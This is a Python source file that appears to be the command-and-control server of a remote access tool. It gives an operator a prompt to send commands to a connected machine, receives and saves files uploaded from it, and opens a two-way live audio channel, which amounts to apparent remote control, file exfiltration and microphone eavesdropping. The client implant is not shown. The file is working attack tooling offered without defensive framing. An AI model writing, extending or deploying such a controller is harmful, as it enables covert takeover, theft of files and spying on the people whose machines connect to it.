
import socket
import threading
import pyaudio
import os

HOST = '0.0.0.0'
PORT = 7771
VOICE_PORT = 5001
DOWNLOAD_FOLDER = r"C:\Users\ghost\Desktop\server"

def handle_command_client(conn, addr):
    print(f"[+] Connected to {addr} for command/data")

    def receive_data():
        buffer = b""
        file_mode = False
        filename = ""

        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break

                if b"FILE_TRANSFER_BEGIN" in data:
                    file_mode = True
                    buffer = b""
                    continue

                if file_mode:
                    if b"FILE_TRANSFER_END" in data:
                        file_mode = False
                        os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
                        safe_name = os.path.basename(filename)
                        save_path = os.path.join(DOWNLOAD_FOLDER, safe_name)
                        with open(save_path, "wb") as f:
                            f.write(buffer)
                        print(f"[+] File saved to: {save_path}")
                        filename = ""
                        continue
                    elif not filename:
                        filename = data.decode().strip()
                    else:
                        buffer += data
                else:
                    print(data.decode(errors="ignore").strip())

            except Exception as e:
                print(f"[-] Error receiving data: {e}")
                break

    threading.Thread(target=receive_data, daemon=True).start()

    try:
        while True:
            cmd = input("Command> ").strip()
            if cmd:
                conn.sendall(cmd.encode())
    except KeyboardInterrupt:
        print("[!] Command server shutting down.")
    finally:
        conn.close()

def handle_voice_call(conn, addr):
    print(f"[+] Voice call connected from {addr}")
    audio = pyaudio.PyAudio()
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    input_stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    output_stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)

    def send_audio():
        while True:
            try:
                data = input_stream.read(CHUNK)
                conn.sendall(data)
            except:
                break

    def receive_audio():
        while True:
            try:
                data = conn.recv(CHUNK)
                output_stream.write(data)
            except:
                break

    threading.Thread(target=send_audio, daemon=True).start()
    threading.Thread(target=receive_audio, daemon=True).start()

def start_server():
    # Command/data socket
    command_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_sock.bind((HOST, PORT))
    command_sock.listen(1)
    print(f"[+] Waiting for command client on {HOST}:{PORT}...")
    cmd_conn, cmd_addr = command_sock.accept()
    threading.Thread(target=handle_command_client, args=(cmd_conn, cmd_addr), daemon=True).start()

    # Voice call socket
    voice_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    voice_sock.bind((HOST, VOICE_PORT))
    voice_sock.listen(1)
    print(f"[+] Waiting for voice call on {HOST}:{VOICE_PORT}...")
    voice_conn, voice_addr = voice_sock.accept()
    handle_voice_call(voice_conn, voice_addr)

if __name__ == "__main__":
    start_server()
